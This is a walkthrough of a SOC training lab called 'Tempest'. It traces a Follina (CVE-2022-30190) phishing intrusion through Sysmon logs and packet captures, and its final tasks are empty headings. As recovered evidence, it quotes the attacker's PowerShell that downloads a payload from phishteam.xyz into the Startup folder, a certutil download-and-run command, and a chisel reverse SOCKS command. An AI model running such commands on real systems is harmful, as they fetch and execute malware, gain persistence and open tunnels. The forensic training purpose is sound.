# Tempest

## Introduction

This room is a capstone challenge for the SOC 1 learning path. 

### Task 3: Preparation - Tools and Artifacts
This task shows us how to prepare the data for use with Timeline Explorer, as well as SysmonView

<img width="1080" height="594" alt="image" src="https://github.com/user-attachments/assets/3b9ae910-d797-4b8f-9efb-5ca1fa8c3810" />

The task also asks us to find the SHA256 hashes of the incident files. This is done with the Powershell command `Get-FileHash`

<img width="835" height="272" alt="image" src="https://github.com/user-attachments/assets/280cbf90-41fa-4ae0-b175-51f4a5d1a954" />

#### Task 3 Questions:
**What is the SHA256 hash of the capture.pcapng file?**
> CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6

**What is the SHA256 hash of the sysmon.evtx file?**
> 665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F

**What is the SHA256 hash of the windows.evtx file?**
> D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60

### Task 4: Initial Access - Malicious Document
We are investigating a CRITICAL severity alert. The analyst who escalated this alert has gathered some information for us:
- The malicious document has a .doc extension.
- The user downloaded the malicious document via chrome.exe.
- The malicious document then executed a chain of commands to attain code execution.

Additionally, the tasks has some notes for us:
- Start with the events generated by Sysmon.
- EvtxEcmd, Timeline Explorer, and SysmonView can interpret Sysmon logs.
- Follow the child processes of WinWord.exe.
- Use filters such as ParentProcessID or ProcessID to correlate the relationship of each process.
- We can focus on Sysmon events such as Process Creation (Event ID 1) and DNS Queries (Event ID 22) to correlate the activity generated by the malicious document.

#### Task 4 Questions:
**The user of this machine was compromised by a malicious document. What is the file name of the document?**
> free_magicules.doc

Searching for file creation events (Event ID 11) and file stream creation events (Event ID 15) near the start of the logs, we can find the events where the malicious file was downloaded.

**What is the name of the compromised user and machine?**

*Format: username-machine name*
> benimaru-TEMPEST

We can find this as the User field in the download events

**What is the PID of the Microsoft Word process that opened the malicious document?**
> 496

Looking for Process Create events (Event ID 1) shortly after the download, we can see the first event after the download was in fact a Microsoft Word process, and we can confirm that it opened the malicious file in the Command Line field

<img width="1068" height="209" alt="image" src="https://github.com/user-attachments/assets/6e069d3d-913c-4301-b12b-92c5fc99d4a5" />

**Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?**
> 167.71.199.191

Looking at the DNS query events (Event ID 22) just before the malicious file was downloaded, one of the requested domains stands out: `phishteam.xyz`. The IP that it resolves to is given in the Query Results field
<img width="577" height="186" alt="image" src="https://github.com/user-attachments/assets/d2b2f15f-6f66-49c0-86d1-939661592757" />

**What is the base64 encoded string in the malicious payload executed by the document?**
> JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==

To find this, we filter for events with ParentProcessID matching the PID of the Microsoft Word process that opened the malicious document (496), and we can see 6 results. Looking through the results, one of the entries has `Invoke-Expression` and `FromBase64String`, indicating execution from an obfuscated string


**What is the CVE number of the exploit used by the attacker to achieve a remote code execution?**

*Format: XXXX-XXXXX*
> 2022-30190

I had to search for the start of the command: `C:\Windows\SysWOW64\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param`. This showed me the Follina RCE Vulnerability, CVE 2022-30190

### Task 5: Initial Access - Stage 2 execution
Now we can decode the base64, and look at the commands that it executes:
`$app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;`

Line by line:
`$app=[Environment]::GetFolderPath('ApplicationData')`: Set the AppData folder path to $app
`cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"`: Change working directory to the Startup folder
`iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip`: iwr is an alias for Invoke-WebRequest. This line downloads a payload from the same malicious domain we saw earlier
`Expand-Archive .\update.zip -DestinationPath .`: Extracts the contents of the zip file payload that was just downloaded
`rm update.zip`: Deletes the zip file

This set of commands downloads a zip file to the Startup folder, extracts it, and then deletes the original archive, leaving the extracted file in the Startup folder.

The task also gives us a few tips:
- The Autostart execution reflects explorer.exe as its parent process ID.
- Child processes of explorer.exe within the event timeframe could be significant.
- Process Creation (Event ID 1) and File Creation (Event ID 11) succeeding the document execution are worth checking.

#### Task 5 Questions:
**The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?**
> C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

This is the path we found in the obfuscated string, we just had to replace $app with the full AppData path

**The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?**

*Format: Remove the double quotes from the log.*
> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe

Filtering for processes with `C:\Windows\explorer.exe` as their ParentImage, the last entry with ParentUser TEMPEST\benimaru shows the command we are looking for.

At this point I had only looked at the logs in Event Viewer, but I was running into 

**Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?**
> CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8

In the previous step we found that first.exe was downloaded. We can filter for this and look for an entry with first.exe as the executable:

<img width="379" height="162" alt="image" src="https://github.com/user-attachments/assets/ae734c7c-d640-4d17-ab05-da64c2d179b9" />

With this we can see the hashes associated with this file:

<img width="1012" height="159" alt="image" src="https://github.com/user-attachments/assets/004b59ce-c021-4bf8-bf9e-6b128f3790ec" />

**The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?**

*Format: domain:port*
> resolvecyber.xyz:80

For this task I used SysmonView. Selecting first.exe makes it easy to see the network connections associated with the executable.

<img width="469" height="765" alt="image" src="https://github.com/user-attachments/assets/f99ae9b2-dd23-46b4-9252-01d1203c94b8" />

### Task 6: Initial Access - Malicious Document Traffic
We are now tasked with looking into the pcap file. We have the malicious domain and IP that we found in the last task.
The task suggests using this Brim filter: `_path=="http" "<malicious domain>"`, so we filter for the malicious IP that first.exe was downloaded from earlier

#### Task 6 Questions:
**What is the URL of the malicious payload embedded in the document?**
> http://phishteam.xyz/02dcf07/index.html

We have two malicious domains to look at: phishteam.xyz, and resolvecyber.xyz. We will look into both, but for this question we search for phishteam.xyz.

<img width="860" height="357" alt="image" src="https://github.com/user-attachments/assets/df129d12-a3bc-48c1-a1da-afc0068c73d9" />

**What is the encoding used by the attacker on the c2 connection?**
> base64

This time we will search for the domain that was used as a c2 server (resolvecyber.xyz).
Many of the GET requests have a lot of encoded data in their queries, which seems to be in base64.

<img width="1190" height="354" alt="image" src="https://github.com/user-attachments/assets/62a58132-f327-47ec-b587-4d165f4badd6" />

The next 3 questions all have to do with what is shown in the last image
**The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?**
> q

**The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?**
> /9ab62b5

**What is the HTTP method used by the binary?**
> GET

**Based on the user agent, what programming language was used by the attacker to compile the binary?**

*Format: Answer in lowercase*
> nim

The user agent is: `Nim httpclient/1.6.6`

### Task 7: Discovery - Internal Reconnaissance
#### Task 7 Questions:
**The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?**
> infernotempest

Looking through the base64 encoded data sent to the c2 domain, one has a $pass variable that seems to be what we are looking for.

<img width="1430" height="712" alt="image" src="https://github.com/user-attachments/assets/fcfdcb9f-70c4-4835-90ed-a5ebdd595659" />

**The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?**
> 5985

The request after the one we saw in the last question is the longest by far, and contains the information the attacker found from their enumeration.

<img width="1497" height="773" alt="image" src="https://github.com/user-attachments/assets/05a48474-e820-46b9-a219-6decc54ea5d6" />

Port 5985 is the default TCP port for Windows Remote Management (WinRM) over HTTP, and seems much more likely to be used for a remote shell than the others.

**The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?**

*Format: Remove the double quotes from the log.*
> C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks

I was unsure of what to look for for this question, so I looked into reverse socks proxies. I eventually searched for "socks" and found the command line used to initate the connection, which used the ch.exe file that was downloaded from the `phishteam.xyz` domain earlier.

<img width="983" height="135" alt="image" src="https://github.com/user-attachments/assets/391dfb70-268f-4208-8e8d-1272a9ff299e" />

**What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?**
> 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451

The SHA256 hash is in the same entry as we found the command from the last question.

**What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.**
> chisel

Searching for the hash on VirusTotal shows a malicious file. The Names section gives us the information we are looking for:

<img width="367" height="303" alt="image" src="https://github.com/user-attachments/assets/87769810-0843-47c4-ad13-08494b8a04c5" />

**The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?**

*Format: Answer in lowercase*
> winrm

This is the service associated with the port we found earlier that could provide a remote shell.

### Task 8: Privilege Escalation - Exploiting Privileges
#### Task 8 Questions:
### Task 9: Actions on Objective - Fully-owned Machine
#### Task 9 Questions:







## Conclusion and Learning Outcomes
